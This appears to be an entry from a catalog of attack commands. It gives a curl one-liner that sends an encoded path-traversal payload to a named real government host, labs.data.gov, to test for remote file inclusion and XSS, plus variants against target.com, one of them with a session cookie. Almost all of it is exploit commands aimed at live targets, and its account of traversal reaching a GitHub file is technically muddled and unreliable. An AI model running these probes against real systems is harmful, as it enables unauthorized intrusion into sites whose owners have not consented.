---
data: >-
  curl -s
  "https://labs.data.gov/dashboard/index.php/docs/index/..%2f..%2f..%2f..%2fadborden%2fpoc%2Fmaster%2fpoc4"
  | grep -i "<script>"
tags:
  - rfi
  - xss
  - web
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:22.773Z'
id: 2ed2090a-b99d-4887-a12e-bb5ab59ac9b9
verified: false
validated: true
submitted: true
---
# curl-rfi-xss-test

## Command

```bash
curl -s "https://labs.data.gov/dashboard/index.php/docs/index/..%2f..%2f..%2f..%2fadborden%2fpoc%2Fmaster%2fpoc4" | grep -i "<script>"
```

## Description

This command exploits RFI by requesting a URL with deep traversal to a GitHub .md file containing JavaScript, filtering the response for script tags to verify inclusion and potential XSS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode for clean output | Yes |
| URL | Endpoint with traversal to GitHub path | Yes |
| `| grep -i "<script>"` | Detects embedded JavaScript in response | No |

## Examples

### Basic Usage

```bash
curl -s "https://target.com/docs/index/..%2f..%2f..%2f..%2fuser%2fmalicious%2fscript.md"
```

### Advanced Usage

```bash
curl -s -X GET "https://target.com/docs/index/..%2f..%2f..%2f..%2frepo%2fmain%2fpoc.md" --cookie "session=abc" --verbose
```

## Expected Output

Response includes the remote .md content with <script> tags; in a browser, this would execute JavaScript, but curl shows raw HTML indicating successful RFI.

## Related

- [[Related Procedure: Exploit-RFI-via-GitHub-Fallback-for-XSS]]
